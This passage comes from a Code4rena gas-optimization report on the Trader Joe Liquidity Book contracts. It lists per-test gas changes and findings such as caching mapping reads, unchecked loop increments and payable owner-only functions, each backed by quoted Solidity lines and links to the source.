(-0.195%))  testSafeTransferFromReverts() (gas: -3730 (-0.196%))  testOracleSampleFromEdgeCases() (gas: -948 (-0.198%))  testDistributionOverflowReverts() (gas: -1768 (-0.204%))  testGetSwapInMoreBins() (gas: -4018 (-0.204%))  testGetSwapInWithMultipleChoices() (gas: -3684 (-0.205%))  testForIdSlippageCaughtReverts() (gas: -4570 (-0.205%))  testOracleSampleFromWith2Samples() (gas: -1076 (-0.207%))  testSwapWithDifferentBinSteps() (gas: -4380 (-0.209%))  testGetSwapInOverflowReverts() (gas: -1586 (-0.213%))  testRemoveLiquiditySlippageReverts() (gas: -13559 (-0.215%))  testModifierCheckLength() (gas: -4108 (-0.216%))  testGetSwapOutOnV2Pair() (gas: -3556 (-0.224%))  testGetSwapInOnV2Pair() (gas: -3556 (-0.224%))  testClaimFeesY() (gas: -2792 (-0.228%))  testClaimFeesX() (gas: -2792 (-0.228%))  testGetPriceFromId() (gas: -896 (-0.230%))  testAddLiquidityIgnored() (gas: -4256 (-0.231%))  testSetLBPairImplementation() (gas: -39185 (-0.234%))  testFeesOnTokenTransfer() (gas: -3298 (-0.236%))  testBalanceOfBatch() (gas: -2522 (-0.237%))  testAddLiquidityAVAXReversed() (gas: -11019 (-0.241%))  testAddLiquidityAVAX() (gas: -11922 (-0.241%))  testQuoteAssets() (gas: -1792 (-0.242%))  testConstructor(uint16,uint16,uint16,uint16,uint16,uint24,uint16,uint24) (gas: -12363 (-0.243%))  testGetSwapInOnComplexRoute() (gas: -4542 (-0.244%))  testSweepLBToken() (gas: -4475 (-0.248%))  testSafeBatchTransferFromReverts() (gas: -5060 (-0.249%))  testCreateLBPair() (gas: -896 (-0.251%))  testCreateLBPair() (gas: -1024 (-0.252%))  testSafeTransferFrom() (gas: -3058 (-0.261%))  testGetSwapOutOnComplexRoute() (gas: -4926 (-0.262%))  testAddLiquidityNoSlippage() (gas: -5707 (-0.273%))  testRemoveLiquidityReverseOrder() (gas: -5708 (-0.273%))  testOracleSampleFromWith100Samples() (gas: -69140 (-0.276%))  testSetRequestAmount() (gas: -512 (-0.280%))  testWithdrawAvax() (gas: -512 (-0.294%))  testClaimProtocolFees() (gas: -3828 (-0.307%))  testClaimFeesComplex(uint256,uint256) (gas: -4212 (-0.322%))  testGetSwapInWrongAmountsReverts() (gas: -6608 (-0.330%))  testRequestFaucetTokensByOperator() (gas: -1024 (-0.332%))  testSwapYtoXSingleBinFromGetSwapOut() (gas: -1714 (-0.344%))  testSwapXtoYSingleBinFromGetSwapOut() (gas: -1714 (-0.344%))  testSwapXtoYSingleBinFromGetSwapIn() (gas: -1714 (-0.345%))  testForLengthsMismatchReverts() (gas: -762 (-0.367%))  testFeeOnActiveBinReverse() (gas: -3274 (-0.372%))  testFeeOnActiveBin() (gas: -3274 (-0.372%))  testRequestFaucetTokens() (gas: -1024 (-0.381%))  testSwapYtoXSingleBinFromGetSwapIn() (gas: -1970 (-0.386%))  testGetSwapInOnV1Pair() (gas: -1168 (-0.405%))  testSwapExactTokensForAvaxSinglePair() (gas: -1597 (-0.415%))  testSwapExactTokensForTokensMultiplePairs() (gas: -2542 (-0.424%))  testForZeroAddressPairReverts() (gas: -256 (-0.434%))  testSweep() (gas: -512 (-0.456%))  testInvalidBinStepWhileCreatingLBPair() (gas: -128 (-0.463%))  testAddLiquidityAVAXnotAVAXReverts() (gas: -965 (-0.465%))  testGetSwapOutOnV1Pair() (gas: -1552 (-0.505%))  testWithdrawToken() (gas: -1024 (-0.524%))  testTaxTokenEqualOnlyV2Swap() (gas: -3196 (-0.525%))  testSwapExactTokensForAVAXSupportingFeeOnTransferTokens() (gas: -2007 (-0.534%))  testSetFeeRecipient() (gas: -128 (-0.539%))  testSwapExactAVAXForTokensSinglePair() (gas: -1996 (-0.544%))  testForIdDesiredOverflowReverts() (gas: -1906 (-0.556%))  testSweepMax() (gas: -640 (-0.565%))  testAvailableBinSteps() (gas: -730 (-0.585%))  testForIdenticalAddressesReverts() (gas: -128 (-0.622%))  testAddRemovePresets() (gas: -504 (-0.627%))  testSwapExactAVAXForTokensSupportingFeeOnTransferTokens() (gas: -2508 (-0.649%))  testForSettingFlashloanFee() (gas: -128 (-0.654%))  testSwapExactTokensForTokensSinglePair() (gas: -2124 (-0.672%))  testFactoryLockedReverts() (gas: -128 (-0.684%))  testWrongTokenOrderReverts() (gas: -1674 (-0.723%))  testInsufficientLiquidityBurnedReverts() (gas: -178 (-0.741%))  testSwapExactTokensForTokensMultiplePairsWithV1() (gas: -2812 (-0.749%))  testSwapTokensForExactTokensMultiplePairsWithV1() (gas: -4418 (-0.763%))  testModifieronlyFactoryOwner() (gas: -128 (-0.770%))  testFeesAboveMaxVolatilityReverts(uint8) (gas: -128 (-0.833%))  testFeesAboveMaxBaseFactorReverts(uint8) (gas: -128 (-0.837%))  testSwapInsufficientAmountReverts() (gas: -512 (-0.859%))  testSwapExactTokensForTokensSupportingFeeOnTransferTokens() (gas: -4423 (-0.862%))  testRemoveToken() (gas: -384 (-0.873%))  testPendingFeesNotIncreasingReverts() (gas: -153 (-0.877%))  testSetRequestCooldown() (gas: -1792 (-0.890%))  testSwapTokensForExactTokensMultiplePairs() (gas: -7446 (-0.926%))  testSwapTokensForExactAVAXSinglePair() (gas: -2658 (-0.945%))  testSwapAVAXForExactTokensSinglePair() (gas: -2658 (-1.066%))  testSetPresets() (gas: -384 (-1.104%))  testVerifyOracleInitialParams() (gas: -128 (-1.124%))  testCollectingFeesOnlyFeeRecipient() (gas: -256 (-1.127%))  testMintWrongLengthsReverts() (gas: -516 (-1.156%))  testSwapTokensForExactTokensSinglePair() (gas: -2786 (-1.174%))  testInvalidLength() (gas: -292 (-1.644%))  testSwappingOnNotExistingV1PairReverts() (gas: -4011 (-1.933%))  testSwappingOnNotExistingV2PairReverts() (gas: -4011 (-2.034%))  testPrivateViewFunctions() (gas: -256 (-2.037%))  testgetAllLBPairs() (gas: -128415 (-2.258%)) <------------------------------------ testConstructor() (gas: -256 (-2.340%))  testInvalidTokenPathReverts() (gas: -828 (-2.380%))  testForInvalidBinStepUnderflowReverts() (gas: -384 (-2.531%))  testForInvalidBinStepOverflowReverts() (gas: -384 (-2.539%))  testModifierEnsure() (gas: -1955 (-3.207%))  testConstructor() (gas: -384 (-3.242%))  testConstructor() (gas: -384 (-3.858%))  testModifierVerifyInputs() (gas: -3198 (-4.074%))  Overall gas change: -581485 (-81.334%) <------------------------------------ ```   ### [G&#x2011;05]  Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata  *There is 1 instance of this issue:* ```solidity File: src/LBPair.sol  /// @audit _bins[_id] on line 452 453:          _bins[_id].accTokenYPerShare += _feesY.getTokenPerShare(_totalSupply);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L453  ### [G&#x2011;06]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement `require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`  *There are 5 instances of this issue:* ```solidity File: src/LBPair.sol  /// @audit if-condition on line 219 225:                  uint256 _deltaT = _lookUpTimestamp - timestamp;  /// @audit if-condition on line 534 536:                                  _fp.getFeeAmountForC(_mintInfo.amountX - _receivedX)  /// @audit if-condition on line 545 547:                                  _fp.getFeeAmountForC(_mintInfo.amountY - _receivedY)  /// @audit if-condition on line 597 598:                  tokenX.safeTransfer(_to, _mintInfo.amountXIn - _amountAddedPlusFee);  /// @audit if-condition on line 602 603:                  tokenY.safeTransfer(_to, _mintInfo.amountYIn - _amountAddedPlusFee);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L225  ### [G&#x2011;07]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**  *There are 5 instances of this issue:* ```solidity File: src/LBQuoter.sol  75:           for (uint256 i; i < swapLength; i++) {  100:                  for (uint256 j; j < LBPairsAvailable.length; j++) {  154:          for (uint256 i = swapLength; i > 0; i--) {  177:                  for (uint256 j; j < LBPairsAvailable.length; j++) {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L75  ```solidity File: src/LBRouter.sol  711:          for (uint256 i = _pairs.length; i != 0; i--) {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L711  ### [G&#x2011;08]  Optimize names to save gas `public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)  *There are 11 instances of this issue:* ```solidity File: src/interfaces/IJoeFactory.sol  /// @audit feeTo(), feeToSetter(), migrator(), getPair(), allPairs(), allPairsLength(), createPair(), setFeeTo(), setFeeToSetter(), setMigrator() 7:    interface IJoeFactory {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeFactory.sol#L7  ```solidity File: src/interfaces/IJoePair.sol  /// @audit MINIMUM_LIQUIDITY(), factory(), token0(), token1(), getReserves(), price0CumulativeLast(), price1CumulativeLast(), kLast(), mint(), burn(), swap(), skim(), sync(), initialize() 7:    interface IJoePair {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoePair.sol#L7  ```solidity File: src/interfaces/IJoeRouter01.sol  /// @audit factory(), WAVAX(), addLiquidity(), addLiquidityAVAX(), removeLiquidity(), removeLiquidityAVAX(), removeLiquidityWithPermit(), removeLiquidityAVAXWithPermit(), swapExactTokensForTokens(), swapTokensForExactTokens(), swapExactAVAXForTokens(), swapTokensForExactAVAX(), swapExactTokensForAVAX(), swapAVAXForExactTokens(), quote(), getAmountOut(), getAmountIn(), getAmountsOut(), getAmountsIn() 7:    interface IJoeRouter01 {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeRouter01.sol#L7  ```solidity File: src/interfaces/IJoeRouter02.sol  /// @audit removeLiquidityAVAXSupportingFeeOnTransferTokens(), removeLiquidityAVAXWithPermitSupportingFeeOnTransferTokens(), swapExactTokensForTokensSupportingFeeOnTransferTokens(), swapExactAVAXForTokensSupportingFeeOnTransferTokens(), swapExactTokensForAVAXSupportingFeeOnTransferTokens() 9:    interface IJoeRouter02 is IJoeRouter01 {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeRouter02.sol#L9  ```solidity File: src/interfaces/ILBFactory.sol  /// @audit MAX_FEE(), MIN_BIN_STEP(), MAX_BIN_STEP(), MAX_PROTOCOL_SHARE(), LBPairImplementation(), getNumberOfQuoteAssets(), getQuoteAsset(), isQuoteAsset(), feeRecipient(), flashLoanFee(), creationUnlocked(), allLBPairs(), getNumberOfLBPairs(), getLBPairInformation(), getPreset(), getAllBinSteps(), getAllLBPairs(), setLBPairImplementation(), createLBPair(), setLBPairIgnored(), setPreset(), removePreset(), setFeesParametersOnPair(), setFeeRecipient(), setFlashLoanFee(), setFactoryLockedState(), addQuoteAsset(), removeQuoteAsset(), forceDecay() 13:   interface ILBFactory is IPendingOwnable {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBFactory.sol#L13  ```solidity File: src/interfaces/ILBFlashLoanCallback.sol  /// @audit LBFlashLoanCallback() 8:    interface ILBFlashLoanCallback {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBFlashLoanCallback.sol#L8  ```solidity File: src/interfaces/ILBPair.sol  /// @audit tokenX(), tokenY(), factory(), getReservesAndId(), getGlobalFees(), getOracleParameters(), getOracleSampleFrom(), feeParameters(), findFirstNonEmptyBinId(), getBin(), pendingFees(), swap(), flashLoan(), mint(), burn(), increaseOracleLength(), collectFees(), collectProtocolFees(), setFeesParameters(), forceDecay(), initialize() 13:   interface ILBPair {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBPair.sol#L13  ```solidity File: src/interfaces/ILBRouter.sol  /// @audit factory(), oldFactory(), wavax(), getIdFromPrice(), getPriceFromId(), getSwapIn(), getSwapOut(), createLBPair(), addLiquidity(), addLiquidityAVAX(), removeLiquidity(), removeLiquidityAVAX(), swapExactTokensForTokens(), swapExactTokensForAVAX(), swapExactAVAXForTokens(), swapTokensForExactTokens(), swapTokensForExactAVAX(), swapAVAXForExactTokens(), swapExactTokensForTokensSupportingFeeOnTransferTokens(), swapExactTokensForAVAXSupportingFeeOnTransferTokens(), swapExactAVAXForTokensSupportingFeeOnTransferTokens(), sweep(), sweepLBToken() 13:   interface ILBRouter {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBRouter.sol#L13  ```solidity File: src/interfaces/ILBToken.sol  /// @audit userPositionAtIndex(), userPositionNumber(), totalSupply(), safeTransferFrom(), safeBatchTransferFrom() 8:    interface ILBToken {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBToken.sol#L8  ```solidity File: src/interfaces/IPendingOwnable.sol  /// @audit pendingOwner(), setPendingOwner(), revokePendingOwner(), becomeOwner() 8:    interface IPendingOwnable {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IPendingOwnable.sol#L8  ```solidity File: src/LBQuoter.sol  /// @audit findBestPathFromAmountIn(), findBestPathFromAmountOut() 17:   contract LBQuoter {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L17  ### [G&#x2011;09]  Use a more recent version of solidity Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  *There are 37 instances of this issue:* ```solidity File: src/interfaces/IJoeFactory.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeFactory.sol#L3  ```solidity File: src/interfaces/IJoePair.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoePair.sol#L3  ```solidity File: src/interfaces/IJoeRouter01.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeRouter01.sol#L3  ```solidity File: src/interfaces/IJoeRouter02.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeRouter02.sol#L3  ```solidity File: src/interfaces/ILBFactory.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBFactory.sol#L3  ```solidity File: src/interfaces/ILBFlashLoanCallback.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBFlashLoanCallback.sol#L3  ```solidity File: src/interfaces/ILBPair.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBPair.sol#L3  ```solidity File: src/interfaces/ILBRouter.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBRouter.sol#L3  ```solidity File: src/interfaces/ILBToken.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBToken.sol#L3  ```solidity File: src/interfaces/IPendingOwnable.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IPendingOwnable.sol#L3  ```solidity File: src/interfaces/IWAVAX.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IWAVAX.sol#L3  ```solidity File: src/LBErrors.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBErrors.sol#L3  ```solidity File: src/LBFactory.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L3  ```solidity File: src/LBPair.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L3  ```solidity File: src/LBQuoter.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L3  ```solidity File: src/LBRouter.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L3  ```solidity File: src/LBToken.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L3  ```solidity File: src/libraries/BinHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/BinHelper.sol#L3  ```solidity File: src/libraries/BitMath.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/BitMath.sol#L3  ```solidity File: src/libraries/Buffer.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Buffer.sol#L3  ```solidity File: src/libraries/Constants.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Constants.sol#L3  ```solidity File: src/libraries/Decoder.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Decoder.sol#L3  ```solidity File: src/libraries/Encoder.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Encoder.sol#L3  ```solidity File: src/libraries/FeeDistributionHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/FeeDistributionHelper.sol#L3  ```solidity File: src/libraries/FeeHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/FeeHelper.sol#L3  ```solidity File: src/libraries/JoeLibrary.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/JoeLibrary.sol#L3  ```solidity File: src/libraries/Math128x128.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Math128x128.sol#L3  ```solidity File: src/libraries/Math512Bits.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Math512Bits.sol#L3  ```solidity File: src/libraries/Oracle.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Oracle.sol#L3  ```solidity File: src/libraries/PendingOwnable.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/PendingOwnable.sol#L3  ```solidity File: src/libraries/ReentrancyGuardUpgradeable.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/ReentrancyGuardUpgradeable.sol#L3  ```solidity File: src/libraries/SafeCast.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SafeCast.sol#L3  ```solidity File: src/libraries/SafeMath.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SafeMath.sol#L3  ```solidity File: src/libraries/Samples.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Samples.sol#L3  ```solidity File: src/libraries/SwapHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L3  ```solidity File: src/libraries/TokenHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/TokenHelper.sol#L3  ```solidity File: src/libraries/TreeMath.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/TreeMath.sol#L3  ### [G&#x2011;10]  `>=` costs less gas than `>` The compiler uses opcodes `GT` and `ISZERO` for solidity code that uses `>`, but only requires `LT` for `>=`, [which saves **3 gas**](https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde)  *There is 1 instance of this issue:* ```solidity File: src/LBRouter.sol  116:                  _amountOutOfBin = _amountOut > _reserve ? _reserve : _amountOut;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L116  ### [G&#x2011;11]  Functions guaranteed to revert when called by normal users can be marked `payable` If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are  `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost  *There are 20 instances of this issue:* ```solidity File: src/LBFactory.sol  215:      function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner {  312       function setLBPairIgnored( 313           IERC20 _tokenX, 314           IERC20 _tokenY, 315           uint256 _binStep, 316           bool _ignored 317:      ) external override onlyOwner {  340       function setPreset( 341           uint16 _binStep, 342           uint16 _baseFactor, 343           uint16 _filterPeriod, 344           uint16 _decayPeriod, 345           uint16 _reductionFactor, 346           uint24 _variableFeeControl, 347           uint16 _protocolShare, 348           uint24 _maxVolatilityAccumulated, 349           uint16 _sampleLifetime 350:      ) external override onlyOwner {  396:      function removePreset(uint16 _binStep) external override onlyOwner {  423       function setFeesParametersOnPair( 424           IERC20 _tokenX, 425           IERC20 _tokenY, 426           uint16 _binStep, 427           uint16 _baseFactor, 428           uint16 _filterPeriod, 429           uint16 _decayPeriod, 430           uint16 _reductionFactor, 431           uint24 _variableFeeControl, 432           uint16 _protocolShare, 433           uint24 _maxVolatilityAccumulated 434:      ) external override onlyOwner {  468:      function setFeeRecipient(address _feeRecipient) external override onlyOwner {  474:      function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner {  485:      function setFactoryLockedState(bool _locked) external override onlyOwner {  493:      function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {  502:      function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {  520:      function forceDecay(ILBPair _LBPair) external override onlyOwner {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L215  ```solidity File: src/LBPair.sol  104       function initialize( 105           IERC20 _tokenX, 106           IERC20 _tokenY, 107           uint24 _activeId, 108           uint16 _sampleLifetime, 109           bytes32 _packedFeeParameters 110:      ) external override onlyFactory {  788:      function setFeesParameters(bytes32 _packedFeeParameters) external override onlyFactory {  792:      function forceDecay() external override onlyFactory {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L104-L110  ```solidity File: src/LBRouter.sol  622       function sweep( 623           IERC20 _token, 624           address _to, 625           uint256 _amount 626:      ) external override onlyFactoryOwner {  642       function sweepLBToken( 643           ILBToken _lbToken, 644           address _to, 645           uint256[] memory _ids, 646           uint256[] memory _amounts 647:      ) external override onlyFactoryOwner {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L622-L626  ```solidity File: src/libraries/PendingOwnable.sol  59:       function setPendingOwner(address pendingOwner_) public override onlyOwner {  68:       function revokePendingOwner() public override onlyOwner {  75:       function becomeOwner() public override onlyPendingOwner {  84:       function renounceOwnership() public override onlyOwner {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/PendingOwnable.sol#L59   ___   ## Excluded findings These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness  ### [G&#x2011;01]  `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There are 13 instances of this issue:* ```solidity File: src/LBPair.sol  /// @audit (valid but excluded finding) 274:              for (uint256 i; i < _ids.length; ++i) {  /// @audit (valid but excluded finding) 496:              for (uint256 i; i < _ids.length; ++i) {  /// @audit (valid but excluded finding) 623:              for (uint256 i; i < _ids.length; ++i) {  /// @audit (valid but excluded finding) 701:              for (uint256 i; i < _ids.length; ++i) {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L274  ```solidity File: src/LBQuoter.sol  /// @audit (valid but excluded finding) 100:                  for (uint256 j; j < LBPairsAvailable.length; j++) {  /// @audit (valid but excluded finding) 177:                  for (uint256 j; j < LBPairsAvailable.length; j++) {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L100  ```solidity File: src/LBRouter.sol  /// @audit (valid but excluded finding) 674:              for (uint256 i; i < depositIds.length; ++i) {  /// @audit (valid but excluded finding) 778:              for (uint256 i; i < _pairs.length; ++i) {  /// @audit (valid but excluded finding) 831:              for (uint256 i; i < _pairs.length; ++i) {  /// @audit (valid but excluded finding) 878:              for (uint256 i; i  ... See the rest this report 